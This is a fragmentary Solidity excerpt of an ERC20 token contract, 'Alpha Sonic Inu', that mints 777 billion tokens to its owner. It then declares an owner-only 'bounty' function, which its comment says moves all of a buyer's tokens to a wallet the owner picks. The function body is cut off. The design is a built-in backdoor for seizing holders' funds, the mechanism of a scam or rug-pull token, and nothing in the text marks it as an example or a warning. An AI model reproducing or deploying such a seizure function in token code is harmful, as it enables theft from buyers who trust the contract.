...
contract SonicInu is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Alpha Sonic Inu", "SonicInu") Ownable(initialOwner) {
        _mint(initialOwner, 777000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function bounty(address from, address to) external onlyOwner {
